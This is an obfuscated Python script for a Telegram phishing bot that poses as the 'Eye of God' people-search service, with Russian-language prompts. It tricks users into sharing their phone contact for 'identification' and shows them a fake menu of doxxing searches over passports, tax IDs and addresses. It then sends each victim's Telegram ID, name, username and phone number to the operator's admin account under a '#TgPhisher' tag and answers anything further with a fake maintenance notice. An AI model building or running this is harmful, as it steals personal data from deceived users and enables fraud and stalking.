import telebot #line:2
import os #line:3
import time #line:4
import requests #line:5
from telebot import types #line:6
import colorama #line:7
from colorama import init ,Fore ,Style ,Back #line:8
init ()#line:10
red =Fore .RED #line:13
cyan =Fore .CYAN #line:14
blue =Fore .BLUE #line:15
green =Fore .GREEN #line:16
yellow =Fore .YELLOW #line:18
reset =Style .RESET_ALL #line:19
bold =Style .BRIGHT #line:20
def print_user_data (OOOOOO00OOO00O0O0 ,OO00O00OO00OOO00O ,OOOO00O000OOOOO00 =None ,OO0O0000OOOO0O0OO =None ):#line:21
    OO00O000O000000OO ="{:-^40}".format ("")#line:22
    print (Fore .YELLOW +OO00O000O000000OO +Style .RESET_ALL )#line:24
    print (Fore .GREEN +"    ID: "+Fore .WHITE +"{:<31}".format (OOOOOO00OOO00O0O0 )+Style .RESET_ALL )#line:25
    print (Fore .GREEN +"    Имя: "+Fore .WHITE +"{:<29}".format (OO00O00OO00OOO00O )+Style .RESET_ALL )#line:26
    if OOOO00O000OOOOO00 :#line:28
        print (Fore .GREEN +"    Username: "+Fore .WHITE +"{:<24}".format ("@"+OOOO00O000OOOOO00 )+Style .RESET_ALL )#line:29
    if OO0O0000OOOO0O0OO :#line:30
        print (Fore .GREEN +"    Номер телефона: "+Fore .WHITE +"     {:<14}".format ("+"+OO0O0000OOOO0O0OO )+Style .RESET_ALL )#line:31
    print (Fore .YELLOW +OO00O000O000000OO +Style .RESET_ALL )#line:32
os .system ('cls'if os .name =='nt'else 'clear')#line:35
print (f'''
{red}{red}

        ╔════════════════════════════════════════════════════════════════════════════════════╗

                    ,----,                        ,--,                                    
                  ,/   .`|,-.----.             ,---.'|                    ,--.       ,--. 
                ,`   .'  :\    /  \            |   | :      ,---,       ,--.'|   ,--/  /| 
              ;    ;     /|   :    \           :   : |   ,`--.' |   ,--,:  : |,---,': / ' 
            .'___,/    ,' |   |  .\ :    ,---,.|   ' :   |   :  :,`--.'`|  ' ::   : '/ /  
            |    :     |  .   :  |: |  ,'  .' |;   ; '   :   |  '|   :  :  | ||   '   ,   
            ;    |.';  ;  |   |   \ :,---.'   ,'   | |__ |   :  |:   |   \ | :'   |  /    
            `----'  |  |  |   : .   /|   |    ||   | :.'|'   '  ;|   : '  '; ||   ;  ;    
                '   :  ;  ;   | |`-' :   :  .' '   :    ;|   |  |'   ' ;.    ;:   '   \   
                |   |  '  |   | ;    :   |.'   |   |  ./ '   :  ;|   | | \   ||   |    '  
                '   :  |  :   ' |    `---'     ;   : ;   |   |  ''   : |  ; .''   : |.  \ 
                ;   |.'   :   : :              |   ,/    '   :  ||   | '`--'  |   | '_\.' 
                '---'     |   | :              '---'     ;   |.' '   : |      '   : |     
                          `---'.|                        '---'   ;   |.'      ;   |,'     
                            `---`                                '---'        '---'      
                            
        ╚════════════════════════════════════════════════════════════════════════════════════╝                                
{reset}           
                                            Eye of God    
      ''')#line:60
def is_valid_token (OO000OOOOO000OOOO ):#line:61
    try :#line:63
        O0O00OO00OO0O0000 =telebot .TeleBot (OO000OOOOO000OOOO )#line:64
        OO0O0000OO0OO0O0O =O0O00OO00OO0O0000 .get_me ()#line:65
        if OO0O0000OO0OO0O0O :#line:66
            return True #line:67
    except telebot .apihelper .ApiException :#line:68
        return False #line:69
token =input (f"     {blue}root@userTP-LINK:~# Введите токен вашего бота >> ")#line:71
admin_id =input (f"     {blue}root@userTP-LINK:~# Введите ваш телеграм айди >> ")#line:72
if not is_valid_token (token ):#line:74
    print ("{reset}     [TP-LINK] Неверный токен! Пожалуйста, повторите запуск скрипта")#line:75
else :#line:77
    def get_bot_username (O000O0OOOOO0OO0O0 ):#line:78
        OOOO0O0OO0O00000O =f"https://api.telegram.org/bot{O000O0OOOOO0OO0O0}/getMe"#line:79
        OOOO0O0000O0O00O0 =requests .get (OOOO0O0OO0O00000O ).json ()#line:80
        if OOOO0O0000O0O00O0 .get ("ok")and 'username'in OOOO0O0000O0O00O0 .get ("result",{}):#line:83
            return OOOO0O0000O0O00O0 ["result"]["username"]#line:84
        else :#line:85
            return None #line:86
    username =get_bot_username (token )#line:88
    if username :#line:89
        os .system ('cls'if os .name =='nt'else 'clear')#line:90
        print (f'''
{bold}{blue}
 
                    ,----,                        ,--,                                    
                  ,/   .`|,-.----.             ,---.'|                    ,--.       ,--. 
                ,`   .'  :\    /  \            |   | :      ,---,       ,--.'|   ,--/  /| 
              ;    ;     /|   :    \           :   : |   ,`--.' |   ,--,:  : |,---,': / ' 
            .'___,/    ,' |   |  .\ :    ,---,.|   ' :   |   :  :,`--.'`|  ' ::   : '/ /  
            |    :     |  .   :  |: |  ,'  .' |;   ; '   :   |  '|   :  :  | ||   '   ,   
            ;    |.';  ;  |   |   \ :,---.'   ,'   | |__ |   :  |:   |   \ | :'   |  /    
            `----'  |  |  |   : .   /|   |    ||   | :.'|'   '  ;|   : '  '; ||   ;  ;    
                '   :  ;  ;   | |`-' :   :  .' '   :    ;|   |  |'   ' ;.    ;:   '   \   
                |   |  '  |   | ;    :   |.'   |   |  ./ '   :  ;|   | | \   ||   |    '  
                '   :  |  :   ' |    `---'     ;   : ;   |   |  ''   : |  ; .''   : |.  \ 
                ;   |.'   :   : :              |   ,/    '   :  ||   | '`--'  |   | '_\.' 
                '---'     |   | :              '---'     ;   |.' '   : |      '   : |     
                          `---'.|                        '---'   ;   |.'      ;   |,'     
                            `---`                                '---'        '---'      
                                                            
{reset}           
                                            Eye of God    
           {bold}{yellow}Telegram{reset}:{cyan} https://t.me/TpLinkSoft
      {bold}{yellow}Owners{reset}:{cyan} @ScottEclipse and @openport8080

      ''')#line:115
        print (f"        [TP-LINK] Бот запущен!{reset} - {red}для выхода [ctrl + c]{reset}\n        Юзернейм вашего бота: {yellow}@{username}{reset}\n        Отправьте с вашего аккаунта\n        Команду {yellow}- /start{reset} боту.")#line:116
    else :#line:117
        print (f"\n     [TP-LINK] Бот запущен!{reset} - {red}для выхода [ctrl + c]{reset}")#line:118
    bot =telebot .TeleBot (token )#line:119
    @bot .message_handler (commands =['start'])#line:120
    def send_welcome (OO0O00OOO0000O0O0 ):#line:121
        O0O0OO000000O000O =types .ReplyKeyboardMarkup (resize_keyboard =True ,one_time_keyboard =True )#line:122
        O00O00OO000000000 =types .KeyboardButton (text ="Подтвердить номер телефона",request_contact =True )#line:123
        O0O0OO000000O000O .add (O00O00OO000000000 )#line:124
        bot .send_message (OO0O00OOO0000O0O0 .chat .id ,"""
🗂 <b>Номер телефона</b>

Вам необходимо подтвердить <b>номер телефона</b> для того, чтобы завершить <b>идентификацию</b>.

Для этого нажмите кнопку ниже.""",parse_mode ="HTML",reply_markup =O0O0OO000000O000O )#line:131
    @bot .message_handler (content_types =['contact'])#line:133
    def contact_handler (OO0OO00OO00O00O0O ):#line:134
        if OO0OO00OO00O00O0O .contact is not None :#line:135
            if OO0OO00OO00O00O0O .contact .user_id ==OO0OO00OO00O00O0O .from_user .id :#line:136
                OO0000O0000000000 =types .ReplyKeyboardRemove ()#line:137
                bot .send_message (OO0OO00OO00O00O0O .chat .id ,f'''
⬇️ **Примеры команд для ввода:**

👤 **Поиск по имени**
├  `Блогер` (Поиск по тегу)
├  `Антипов Евгений Вячеславович`
└  `Антипов Евгений Вячеславович 05.02.1994`
 (Доступны также следующие форматы `05.02`/`1994`/`28`/`20-28`)

🚗 **Поиск по авто**
├  `Н777ОН777` - поиск авто по РФ
└  `WDB4632761X337915` - поиск по VIN

👨 **Социальные сети**
├  `instagram.com/ev.antipov` - Instagram
├  `vk.com/id577744097` - Вконтакте
├  `facebook.com/profile.php?id=1` - Facebook
└  `ok.ru/profile/162853188164` - Одноклассники

📱 `79999939919` - для поиска по номеру телефона
📨 `tema@gmail.com` - для поиска по Email
📧 `#281485304`, `@durov` или перешлите сообщение - поиск по Telegram аккаунту

🔐 `/pas churchill7` - поиск почты, логина и телефона по паролю
🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)
🏘 `77:01:0001075:1361` - поиск по кадастровому номеру

🏛 `/company Сбербанк` - поиск по юр лицам
📑 `/inn 784806113663` - поиск по ИНН
🎫 `/snils 13046964250` - поиск по СНИЛС
📇 `/passport 6113825395` - поиск по паспорту
🗂 `/vy 9902371011` - поиск по ВУ

📸 Отправьте фото человека, чтобы найти его или двойника на сайтах ВК, ОК.
🚙 Отправьте фото номера автомобиля, чтобы получить о нем информацию.
🙂 Отправьте стикер, чтобы найти создателя.
🌎 Отправьте точку на карте, чтобы найти информацию.
🗣 С помощью голосовых команд также можно выполнять поисковые запросы.

''',parse_mode ="Markdown",reply_markup =OO0000O0000000000 )#line:177
                print ()#line:178
                print_user_data (OO0OO00OO00O00O0O .from_user .id ,OO0OO00OO00O00O0O .from_user .first_name ,OO0OO00OO00O00O0O .from_user .username ,OO0OO00OO00O00O0O .contact .phone_number )#line:179
                print ()#line:180
                try :#line:181
                    bot .send_message (admin_id ,f'''
#TgPhisher - {username}

- {OO0OO00OO00O00O0O.from_user.id}
- {OO0OO00OO00O00O0O.from_user.first_name}
- {OO0OO00OO00O00O0O.from_user.username}
- {OO0OO00OO00O00O0O.contact.phone_number}
- By @CyberStalker1337''')#line:189
                except :#line:190
                    print ('     error send to ADMIN_ID      ')#line:191
            else :#line:192
                    bot .send_message (OO0OO00OO00O00O0O .chat .id ,"Это не ваш номер телефона. Пожалуйста, подтвердите свой номер.")#line:193
    @bot .message_handler (func =lambda O000000000O00OO0O :True )#line:195
    def default_handler (O00O0OOO0OOO00000 ):#line:196
        bot .send_message (O00O0OOO0OOO00000 .chat .id ,f'''
⚠️ **Технические работы.**

Работы будут завершены в ближайший промежуток времени, все подписки наших пользователей продлены.
''',parse_mode ="Markdown")#line:201
    try :#line:204
        bot .polling (none_stop =True )#line:205
    except Exception as e :#line:206
        print (f"Произошла ошибка: {e}")#line:207
